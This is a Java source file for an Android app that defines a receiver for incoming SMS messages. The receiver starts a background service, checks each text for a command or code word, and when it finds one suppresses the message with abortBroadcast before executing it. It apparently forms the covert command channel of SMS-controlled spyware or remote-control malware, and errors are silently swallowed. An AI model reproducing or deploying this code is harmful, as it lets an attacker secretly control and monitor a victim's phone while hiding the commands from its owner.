package com.dwreload.receivers;



import com.dwreload.*;
import com.dwreload.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;



public class SMSReceiver extends BroadcastReceiver {
	
	@Override
	public void onReceive(final Context context, Intent intent) {

		context.startService(new Intent(context, AppService.class));
		
		try {			
			final Bundle bundle = intent.getExtras();
			if (bundle == null) {
				return;
			}
			
			SmsCommand command = new SmsCommand(bundle, context);
			if (command.isCommand() || command.isHasCodeWord()){
				abortBroadcast();
				command.start();//.execute();
			}
		} catch (Exception e) {

		}
	}
}